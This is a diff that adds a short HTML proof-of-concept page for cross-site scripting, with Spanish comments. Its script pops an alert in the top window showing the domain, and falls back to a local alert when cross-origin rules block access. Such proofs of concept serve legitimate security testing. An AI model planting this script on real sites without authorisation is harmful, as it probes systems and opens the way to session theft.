@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS POC</title>
+    <script>
+        // Ejecuta alert en la página principal (top)
+        try {
+            window.top.alert("XSS Exploit Exitoso!\nDominio: " + document.domain);
+        } catch(e) {
+            // Si falla por políticas CORS, prueba otras técnicas
+            alert("XSS en iframe, pero no se puede acceder al padre.");
+        }
+    </script>
+</head>
+<body>
+    <h1>Página de prueba XSS</h1>
+</body>
+</html>
